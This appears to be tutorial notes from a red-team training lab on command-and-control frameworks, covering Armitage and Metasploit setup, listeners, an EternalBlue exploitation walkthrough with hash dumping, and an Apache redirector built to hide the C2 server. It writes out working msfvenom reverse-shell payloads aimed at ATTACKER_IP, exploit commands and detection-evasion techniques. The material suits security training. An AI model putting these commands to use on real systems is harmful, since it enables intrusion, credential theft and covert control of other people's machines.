### 1. **Overview of C2 Frameworks**
A C2 framework is an organized structure that allows operators (red teamers or malicious actors) to control compromised systems by establishing a persistent channel between the C2 server and agents (compromised devices). This infrastructure supports handling multiple sessions, issuing commands remotely, and facilitating a range of post-exploitation activities, all while attempting to remain undetected.

The basic idea is similar to running a server that listens for incoming reverse shell connections. However, unlike basic tools like Netcat, a C2 framework offers sophisticated session management, automated payload generation, and extensive post-exploitation capabilities, turning it into a hub for a coordinated cyberattack.

---

### 2. **Command and Control Structure**

   #### **C2 Server**
   The core of any C2 framework, the C2 server listens for callbacks from agents and provides an interface through which operators control compromised devices. In practice, the C2 server:
   - Manages all incoming connections from agents.
   - Holds control over each session to allow for individual or simultaneous control of multiple agents.
   - Allows operators to issue commands and receive output from agents in real-time.
   
   Think of it as the central command station where each compromised device calls back, enabling centralized oversight of the attack.

   #### **Agents / Payloads**
   - **Agents**: The software or scripts deployed to a compromised device to enable communication with the C2 server. Unlike simple reverse shells, agents are often complex, featuring additional commands for actions like file upload/download, memory manipulation, and system reconnaissance.
   - **Payloads**: Payloads are delivery mechanisms that can be staged or stageless, depending on whether additional components are fetched after the initial compromise.
     - **Stageless Payloads**: Contain all necessary components within a single file, immediately calling back and initiating communication with the C2 server upon execution.
     - **Staged Payloads**: Operate in two steps:
       1. A small “dropper” (initial code) is deployed to the target.
       2. The dropper then calls back to the C2 server to download additional components of the agent, making it more stealthy and bypassing certain antivirus detections.
     
     Staged payloads are advantageous as they allow operators to “drip-feed” code, reducing detection risks.

   #### **Listeners**
   Listeners are processes running on the C2 server that wait for connections from agents. These listeners can be configured to listen on various ports and protocols (e.g., HTTP, HTTPS, DNS), depending on how the C2 traffic is routed to evade network security controls. Some frameworks even support multiple listener protocols to switch if detection is suspected.

   #### **Beacons**
   Beacons are callbacks sent periodically by agents to the C2 server, enabling it to receive commands or send data back to the server. The frequency and structure of these beacons can be customized to avoid detection:
   - **Sleep Timers**: Setting intervals between beacons, reducing the risk of network-based detection.
   - **Jitter**: Randomizing intervals (e.g., adding or subtracting a percentage of time) between each callback to avoid creating predictable patterns.

---

### 3. **Obfuscating Agent Callbacks and Evasion Techniques**

C2 frameworks are designed to evade detection by making agent communication look as natural as possible. Here are several methods that C2 frameworks use to avoid detection:

   - **Sleep Timers and Jitter**: By adding randomness to the timing of agent callbacks, frameworks avoid creating detectable patterns that may be flagged by network monitoring systems.
   - **Packet Padding**: C2 frameworks may add junk data to packet contents to obfuscate payloads and make them appear as normal traffic or to evade signature-based detection by antivirus (AV) systems.
   - **Domain Fronting**: Using reputable services like Cloudflare to mask the true C2 server location. The C2 communication appears to go to a legitimate domain, but traffic is proxied through the reputable service to the actual C2 server. This technique hides the C2 server’s IP, making it difficult to track or block.
   - **Data Encryption**: Most C2 frameworks use encrypted channels (e.g., HTTPS or custom encrypted protocols) to ensure that traffic cannot be easily inspected or intercepted by security analysts.

   Sample Python code for implementing jitter might look like this:

   ```python
   import random

   sleep = 60
   jitter = random.randint(-30, 30)  # Random interval between -30 and +30 seconds
   sleep = sleep + jitter
   ```

   Advanced frameworks might use algorithms to calculate upper and lower bounds for timing, providing irregular patterns to avoid triggering any alarms.

---

### 4. **Payload Formats**

Payloads can be delivered in multiple formats, tailored to the target’s environment to avoid detection. Here are a few common payload formats:

   - **Executable Files (PE Files)**: These are typical Windows executables (.exe files).
   - **PowerShell Scripts**: Often containing embedded C# code, PowerShell payloads are easily executed on Windows systems and provide flexibility in execution.
   - **HTA and JScript Files**: HTML applications (.hta) and JScript (.js) files can be embedded into web pages or documents to deliver payloads stealthily.
   - **Office Documents**: Payloads can be embedded in Word or Excel documents using VBA macros, which execute code when the document is opened.
   - **Web Payloads**: Some C2 frameworks also support web-based payloads, delivered through phishing or malicious web content.

---

### 5. **Modules in C2 Frameworks**

Modules extend the functionality of agents beyond simple control commands. These are specialized scripts or tools that enable red teams to perform a wide range of operations on compromised machines:

   - **Post Exploitation Modules**: These modules deal with actions taken after the initial compromise, such as:
     - **Reconnaissance**: Running scripts like `SharpHound` to collect Active Directory data for lateral movement.
     - **Credential Dumping**: Extracting credentials from memory (e.g., LSASS process).
     - **File Exfiltration**: Transferring sensitive files back to the C2 server.
   - **Pivoting Modules**: These modules enable operators to access otherwise restricted network segments by routing traffic through a compromised host. This is known as lateral movement or pivoting and often uses protocols like SMB or SSH to relay commands within secured environments.
   
   An example of pivoting:
   1. A compromised machine with access to a restricted network segment acts as a “proxy” for the C2 framework.
   2. Commands are routed through this compromised machine, allowing the C2 server to communicate with devices in otherwise unreachable network zones.

---

### 6. **C2 Profiles**

C2 profiles (or Malleable C2 Profiles) allow operators to tailor HTTP/HTTPS requests to make them look like normal, benign traffic. By modifying specific elements like headers, URIs, and packet size, C2 profiles obfuscate C2 communications, making them difficult to distinguish from legitimate traffic. Here’s how they work:

   - **Customized Headers**: By adding or modifying headers (e.g., using an “X-C2-Server” header), operators can make requests appear normal.
   - **Selective Response**: Only recognized agents receive a C2 response, while unrelated connections (e.g., those from security analysts) are given benign content or redirected to legitimate sites.
   - **Proxy and Reverse Proxy Setup**: Utilizing NGINX or Apache Mod_Proxy, requests are routed to the C2 server only if they match the profile’s criteria, ensuring undetected command exchange between the C2 server and agents.

---

### 7. **Redirectors**

Redirectors act as intermediaries that forward requests to the C2 server. They help disguise the actual IP of the C2 server by acting as a “bounce” server. For example:
   - Redirectors intercept agent requests, check for specified criteria, and only then forward the requests to the actual C2 server.
   - Configuring Apache or NGINX to function as a redirector allows operators to add an additional layer of security, preventing the C2 server’s location from being traced directly.

### **1. Setting Up Armitage**

   **Step 1: Download Armitage from Gitlab**
   ```bash
   root@kali$ git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
   ```
   - This command clones the Armitage repository from GitLab and navigates into the Armitage folder.

   **Step 2: Build Armitage**
   ```bash
   root@kali$ bash package.sh
   ```
   - This command builds the Armitage package. It compiles the necessary files and packages them, generating builds for different operating systems. After completion, the release files are located in the `./release/unix/` directory.

   **Step 3: Verify the Build**
   ```bash
   root@kali$ cd ./release/unix/ && ls -la
   ```
   - This checks if Armitage was successfully built by listing the contents in the `release/unix` directory. Key files to note here are:
     - **Teamserver**: Starts the Armitage server, allowing multiple users to connect.
     - **Armitage**: The client file used to connect to the Armitage server and access the GUI.

---

### **2. Preparing the Environment for Armitage**

Since Armitage relies on the **Metasploit** database, the database must be started and initialized before launching Armitage.

   **Step 1: Start PostgreSQL Database**
   ```bash
   root@kali$ systemctl start postgresql && systemctl status postgresql
   ```
   - This starts PostgreSQL, the database Metasploit uses to track sessions, and checks its status to ensure it is running.

   **Step 2: Initialize the Metasploit Database**
   ```bash
   user@kali$ msfdb --use-defaults delete
   user@kali$ msfdb --use-defaults init
   ```
   - The first command stops and deletes any existing database configuration. 
   - The second command initializes the Metasploit database, creating new database schemas and setting up the database connection for Metasploit.

---

### **3. Starting and Connecting to Armitage**

   **Step 1: Start Armitage Team Server**
   ```bash
   root@kali$ cd /opt/armitage/release/unix && ./teamserver YourIP P@ssw0rd123
   ```
   - Replace `YourIP` with your server’s IP address (typically your tun0 or eth0 interface) and set a secure password (e.g., `P@ssw0rd123`).
   - This command starts the Armitage team server, initializing the remote procedure call (RPC) daemon for connection handling. 

   **Step 2: Start the Armitage Client**
   ```bash
   root@kali$ cd /opt/armitage/release/unix && ./armitage
   ```
   - This launches the Armitage GUI, where you can connect to the team server and manage your C2 operations. After launching, enter the team server’s IP and port, along with the username (`msf`) and password you set earlier.
   - After connecting, set a nickname, which helps you identify your session without interfering with other operators.

---

### **4. Securely Accessing the C2 Server**

To ensure security when operating a C2 framework, follow these guidelines:
   - **Local Interface**: Always use a local IP (tun0/eth0) for the management interface to avoid exposing it on the internet.
   - **SSH Access**: Enable SSH port forwarding so fellow operators can securely connect. For example, users can SSH into the server and port forward TCP/55553, allowing Armitage’s management traffic over SSH without exposing it publicly.

### **5. Final Steps**

Once connected, you should see the Armitage GUI interface. At this point:
   - **Check the Database Status**: Confirm that Metasploit’s database is active to ensure session management works correctly.
   - **Create Listeners**: You can now create listeners for incoming sessions, configure payloads, and customize listener types (e.g., HTTP or HTTPS for more covert operations).
   - **Generate Payloads**: With Armitage connected, you can generate payloads using the “Payload” option in the GUI, specifying parameters like IP address, port, and payload type.

---
Setting up and managing a Command and Control (C2) infrastructure requires both operational security and effective listener configuration to handle sessions from compromised systems. This guide will help you understand secure access techniques, how to set up listeners in Armitage, and explore different types of listeners and their benefits.

---

### **1. Basic Operational Security for C2 Servers**

**Avoid Exposing the C2 Management Interface**  
A critical aspect of operational security is ensuring that your C2 management interface isn’t directly accessible over the internet. Exposing it increases the risk of detection, as specific versions of C2 frameworks like Cobalt Strike can be fingerprinted through unique characteristics (e.g., extra spaces in HTTP responses in versions before 3.13). To avoid easy detection and access by unauthorized users:
- **Restrict Access**: Use local network interfaces (e.g., `127.0.0.1`) and avoid public IPs for management.
- **Firewall Rules**: Use firewall rules or cloud security groups to limit access to the C2 management interface.
- **Regular Audits**: Routinely check for vulnerabilities in C2 infrastructure components and apply updates.

---

### **2. Accessing a C2 Server Listening Locally with SSH Port-Forwarding**

To securely access a C2 server listening on a local-only port (e.g., `TCP/55553`), you can set up SSH port-forwarding. This allows you to connect through SSH to access remote resources that are only locally available on the C2 server. Here’s how:

1. **SSH Port-Forwarding Command**:
   ```bash
   root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
   ```
   - **`-L` flag**: Specifies local port-forwarding.
   - **Port `55553`**: The local port on your machine will forward to port `55553` on the remote server (`127.0.0.1` in this case).
   - **Remote Server IP (`192.168.0.44`)**: Replace with your C2 server’s IP address.

2. **Connect to the C2 Server**: After setting up port forwarding, you can connect to Armitage or any C2 interface running on the specified port as if it were on your local machine.

3. **Benefits of SSH Port-Forwarding**: SSH port-forwarding allows you to access the C2 server through a secure channel without exposing sensitive ports publicly, enhancing operational security.

---

### **3. Configuring a Listener in Armitage**

Listeners are essential in C2 frameworks as they enable the server to receive incoming connections (callbacks) from payloads on compromised machines. To create a listener in Armitage:

1. **Open Listener Configuration in Armitage**:
   - Go to the **Armitage dropdown menu** > **Listeners** > choose **Reverse** (for reverse shells where the victim connects back to the C2 server).

2. **Configure Listener Settings**:
   - **Port**: Set to the desired port (e.g., `TCP/31337`).
   - **Listener Type**: Choose between:
     - **Shell**: Standard reverse shell (similar to Netcat-style).
     - **Meterpreter**: A more advanced Metasploit payload with extended post-exploitation features.

3. **Confirm Listener Creation**:
   - Once configured, a new pane will open showing the listener details, indicating that it’s ready to accept connections.

---

### **4. Generating a Callback with MSFVenom**

To create a payload that calls back to your C2 server:

1. **Generate Payload with MSFVenom**:
   ```bash
   root@kali$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
   ```
   - **Payload**: `windows/meterpreter/reverse_tcp`.
   - **LHOST**: Set to your C2 server IP address (`ATTACKER_IP`).
   - **LPORT**: Set to the listener’s port (e.g., `31337`).
   - **Format (`-f`)**: Set to `exe` for Windows executable format.
   - **Output (`-o`)**: Specifies output file name (`shell.exe`).

2. **Transfer and Execute**:
   - Move the generated payload to the target machine. Once executed, it will initiate a callback to your Armitage listener, establishing a session.

---

### **5. Types of Listeners**

Different listeners support varied operational needs based on protocol, communication style, and evasion techniques. Here are common listener types:

1. **Standard Listener (TCP/UDP)**:
   - **Communication**: Raw socket over TCP or UDP, often in cleartext.
   - **Usage**: Simple and fast for testing; however, lacks security and obfuscation.

2. **HTTP/HTTPS Listeners**:
   - **Communication**: Acts as a web server, often fronting as legitimate HTTP/HTTPS traffic.
   - **Evasion**: HTTP/HTTPS traffic is less likely to be blocked by firewalls, and HTTPS encryption hides the payload content.
   - **Advanced Techniques**: Domain fronting and Malleable C2 profiles can mask C2 traffic, blending it with legitimate web traffic. Many security tools and network defenses may overlook HTTPS traffic as it is encrypted.

3. **DNS Listener**:
   - **Communication**: Uses DNS queries to relay data between the agent and the C2 server.
   - **Usage**: Often used in exfiltration, especially where other protocols are blocked.
   - **Requirements**: Needs a registered domain and public DNS server. It’s particularly effective in bypassing proxies that inspect only HTTP/HTTPS traffic.

4. **SMB Listener**:
   - **Communication**: Uses SMB named pipes within restricted networks, facilitating intra-network communications.
   - **Usage**: Useful in restricted environments with multiple devices communicating via SMB but only one device capable of outbound connections.
   - **Advantages**: Supports pivoting, allowing compromised machines to act as proxies for reaching otherwise inaccessible network segments.

---

### **6. Enhancing Security with Firewall Rules and Restricted Access**

If you need to expose the C2 management interface over the internet, secure it using firewalls and access controls:

1. **Host-Based Firewalls**:
   - **UFW (Uncomplicated Firewall)** or **IPTables** on Linux can restrict access to only specific IP addresses or ranges.
   - For instance, allow access only to trusted IPs:
     ```bash
     sudo ufw allow from <trusted_ip> to any port 55553
     ```

2. **Cloud Security Groups**:
   - For cloud-hosted C2 servers, use security groups to allow only certain IP ranges or VPC peers to access the management port.
   
3. **VPN or SSH Tunneling**:
   - If you’re working with a team, consider using VPNs or SSH tunneling for safe, encrypted access, ensuring the management port isn’t exposed directly.

---

### **Summary**

Managing a C2 infrastructure with Armitage involves securing access, setting up listeners, and understanding listener types that serve different scenarios and network constraints. By following operational security practices, using SSH port-forwarding, configuring firewall rules, and selecting appropriate listeners, you can securely manage and control compromised systems while minimizing detection risks. This setup prepares you for further tasks, such as generating and deploying payloads, establishing sessions, and handling post-exploitation activities.

Here's a structured walkthrough for host enumeration and exploiting a sample Windows 7 machine (vulnerable to the EternalBlue exploit) using Armitage and Metasploit.

---

### **1. Host Enumeration with Armitage**

   - **Step 1: Initiate a Port Scan**  
     - Go to **Hosts** > **Nmap Scan** > **Quick Scan** in Armitage.
     - Enter the IP address of the victim machine (VICTIM_MACHINE) in the prompt for "Enter Scan Range" and click "OK."
     - After a brief wait, you should see the scan results displayed in a new **nmap** tab, which includes open ports and basic service information about the target.

   - **Explore Additional Scans**:  
     - Try using a **Comprehensive Scan** (from **Hosts** > **Nmap Scan**) to gather more in-depth information, such as banners, software versions, and OS details.

---

### **2. Exploitation with Armitage**

   - **Step 1: Identify Vulnerabilities**
     - Armitage categorizes exploits, so expand the **Exploit** > **Windows** > **SMB** dropdown to locate the **EternalBlue** exploit (`ms17_010_eternalblue`) in the right-side panel.
     - Double-click on the exploit (or drag and drop it onto the target host) to open the module configuration window.

   - **Step 2: Configure the Exploit**
     - After the exploit window opens, ensure that all necessary options are correctly set:
       - **RHOST**: Enter the IP address of the victim machine (VICTIM_IP).
       - **Payload**: Choose between **Bind Shell** or **Reverse Shell** based on your setup. For external network access, a reverse shell is recommended.
     - Click **Launch** to start the exploit.

   - **Step 3: Check for Exploitation Success**
     - After launching, a new **Exploit** tab will open, displaying the status of the attempt. If successful, you will gain a shell on the victim machine.

---

### **3. Post-Exploitation with Meterpreter**

   - **Step 1: Interact with the Victim Shell**
     - Right-click on the compromised host in the **Workspace** window and select **Interact**. This opens a command shell interface.
     - To gain a Meterpreter shell, use the **multi/manage/shell_to_meterpreter** module within Metasploit to upgrade the shell. This provides you with enhanced post-exploitation capabilities.

   - **Step 2: Execute Commands and Dump Hashes**
     - Use Meterpreter commands to perform various tasks:
       - `getuid`: Check the user context (should show `NT AUTHORITY\SYSTEM` if successful).
       - `hashdump`: Dump NTLM password hashes from the compromised machine.
     - Example output for `hashdump`:
       ```plaintext
       Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d<snip>4d6e0943c:::
       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae93<snip>d7e0c089c0:::
       Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867<snip>5c1309a5c:::
       ```

   - **Step 3: Retrieve Flags**
     - Use Meterpreter’s `cat` command to read files directly from the victim's system.
     - For example:
       ```plaintext
       meterpreter > cat C:/Users/Administrator/Desktop/root.txt
       THM{bd6ea6c87<snip>21081132744}
       meterpreter > cat C:/Users/Ted/Desktop/user.txt
       THM{217fa45e3<snip>fc0be28e760}
       ```

---

### **4. Using Metasploit for EternalBlue Exploitation (Alternative to Armitage)**

If you'd rather use Metasploit’s console interface:

1. **Launch Metasploit**:
   ```bash
   root@attackbox$ msfconsole -q
   ```
2. **Set Up the EternalBlue Exploit**:
   ```plaintext
   msf5 > use exploit/windows/smb/ms17_010_eternalblue
   msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
   msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST VICTIM_IP
   msf5 exploit(windows/smb/ms17_010_eternalblue) > run
   ```
3. **Confirm Successful Exploitation**:
   - If successful, Meterpreter will open, and you’ll have SYSTEM-level access.

---

### **5. Types of Listeners in C2 Frameworks**

Familiarize yourself with common listener types in C2 frameworks for flexibility in future exploitation tasks:

- **Standard Listener**: Basic TCP/UDP listener that communicates over raw sockets.
- **HTTP/HTTPS Listener**: Fronts as web traffic, often using Malleable C2 profiles for evasion.
- **DNS Listener**: Ideal for environments with limited protocol access, using DNS for communication.
- **SMB Listener**: Uses named pipes for restricted networks, useful for pivoting between multiple hosts.

---

### **Practice and Exploration**

Now that you understand the basics, practice creating listeners, generating payloads, and enumerating additional targets. By experimenting with different exploits and modules in Armitage or Metasploit, you’ll gain a stronger grasp of exploitation and post-exploitation in a controlled environment.

In advanced Command and Control (C2) operations, **Redirectors** play a key role in enhancing operational security by masking the true location of a C2 server. This setup allows incoming requests from compromised machines to pass through an intermediary server (redirector) before reaching the actual C2 server, thereby protecting the C2 infrastructure and adding a layer of obfuscation.

Here's a structured guide for setting up a Redirector using Apache2 and Metasploit, including how to customize HTTP headers to avoid detection and configure the Redirector for secure operation.

---

### **1. Understanding the Purpose of a Redirector**

A Redirector is essentially a **proxy server** that forwards HTTP/HTTPS traffic to the C2 server based on specific conditions (e.g., a particular user-agent header). This setup prevents direct exposure of the C2 server's IP address:
- **Benefit**: If the redirector is reported or detected, the actual C2 server remains unaffected.
- **Use Case**: Redirectors are often used in combination with load balancers or IP filtering rules to manage incoming connections securely.

---

### **2. Configuring Apache2 as a Redirector**

#### **Step 1: Install and Start Apache2 with Required Modules**
Run the following command to install Apache2 and enable necessary modules (`mod_rewrite`, `mod_proxy`, `mod_proxy_http`, and `mod_headers`):
```bash
root@kali$ apt install apache2
root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers
root@kali$ systemctl start apache2 && systemctl status apache2
```
- **mod_rewrite**: Allows URL rewriting and redirection based on specified conditions.
- **mod_proxy & mod_proxy_http**: Enable Apache to act as a reverse proxy, forwarding HTTP requests to the C2 server.
- **mod_headers**: Used to inspect and modify HTTP headers, essential for controlling which requests get forwarded.

#### **Step 2: Modify the Apache2 Configuration**

1. Open the Apache default configuration file:
   ```bash
   root@kali$ nano /etc/apache2/sites-available/000-default.conf
   ```

2. Add the following lines within the `<VirtualHost *:80>` block:
   ```plaintext
   RewriteEngine On
   RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
   ProxyPass "/" "http://localhost:8080/"
   ```
   - **RewriteEngine On**: Enables the rewrite engine to process conditional redirections.
   - **RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"**: Specifies that only HTTP requests with a user-agent string of "NotMeterpreter" will be forwarded to the C2 server.
   - **ProxyPass**: Forwards matched requests to the actual C2 server (in this case, assumed to be running on localhost at port 8080).

3. Restart Apache to apply changes:
   ```bash
   root@kali$ systemctl restart apache2
   ```

### **3. Generating a Customized Payload with MSFvenom**

To simulate HTTP traffic that matches your redirector’s configuration, create a Meterpreter reverse shell payload with a custom user-agent string.

1. **Generate the Payload**:
   ```bash
   root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
   ```
   - **LHOST** and **LPORT**: Set these to the IP and port the C2 server listens on.
   - **HttpUserAgent**: Sets the user-agent to "NotMeterpreter" to match the rewrite rule on the redirector.

2. **Transfer and Execute Payload on the Target**: 
   - After transferring the payload to the victim, execute it. The payload should send HTTP requests that are filtered and forwarded by the redirector based on the custom user-agent header.

### **4. Setting Up Metasploit Handler with Redirector Configuration**

In Metasploit, configure the listener to expect connections coming through the redirector.

1. **Start Metasploit Console**:
   ```bash
   root@kali$ msfconsole
   ```

2. **Configure the Multi/Handler**:
   ```plaintext
   msf6 > use exploit/multi/handler 
   msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
   msf6 exploit(multi/handler) > set LHOST 127.0.0.1
   msf6 exploit(multi/handler) > set LPORT 8080
   msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
   msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
   msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
   msf6 exploit(multi/handler) > set OverrideLPORT 80
   msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
   msf6 exploit(multi/handler) > set OverrideRequestHost true
   msf6 exploit(multi/handler) > run
   ```
   - **OverrideLHOST** and **OverrideLPORT**: Point to the redirector’s IP and port (where the victim connects).
   - **OverrideRequestHost**: Ensures that Metasploit uses the redirector as the apparent destination, masking the true C2 server.

3. **Monitor the Metasploit Console**:
   - If the configuration is correct, you’ll see a Meterpreter session open as the victim machine connects via the redirector.

### **5. Testing and Verifying with Wireshark**

To verify the setup:
1. **Start Wireshark** on your monitoring machine and set a filter for HTTP traffic.
2. **Execute the Payload** on the victim machine.
3. **Check for HTTP Requests**: Look for the HTTP requests containing the modified user-agent "NotMeterpreter." These requests should be forwarded by the redirector to the C2 server.

---

### **6. Summary Diagram of Redirector Setup**

This lab demonstrates a setup where:
1. The **Victim** connects to the **Redirector** (Apache server with rewrite rules).
2. The Redirector inspects the request’s user-agent.
3. If the user-agent matches "NotMeterpreter," it forwards the request to the C2 server (Metasploit).
4. The **C2 Server** handles the Meterpreter session, but the victim only sees the redirector’s IP or domain.

In real-world scenarios, you can enhance this setup by using multiple redirectors, load balancers, and DNS records for extra layers of anonymity and fault tolerance. This approach keeps the C2 infrastructure resilient and challenging to detect, enabling secure and covert command-and-control operations.
